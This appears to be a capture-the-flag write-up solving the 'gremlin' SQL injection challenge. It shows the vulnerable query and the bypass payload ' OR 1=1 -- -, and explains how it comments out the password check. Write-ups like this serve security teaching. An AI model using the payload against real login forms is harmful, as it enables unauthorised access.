---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 1
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/b61527a1-dd8e-479b-b0e7-5cb6d58a8823)

We are provided with the SQL query:

```
SELECT id FROM prob_gremlin WHERE id='' AND pw=''
```

In order to make the result of this query `True`, we can provide the following URI:

```
?id=' OR 1=1 -- -
```

The resultant query then becomes:

```
SELECT id FROM prob_gremlin WHERE id='' OR 1=1 -- -' AND pw=''

## Queried part
SELECT id FROM prob_gremlin WHERE id='' OR 1=1

## Commented part
AND pw=''
```

Since 1=1 is always true, the result of the `OR` operation will always be `True`.

![2](https://github.com/Kunull/Write-ups/assets/110326359/5c172a9d-3333-45b6-bd48-edc0e2def822)
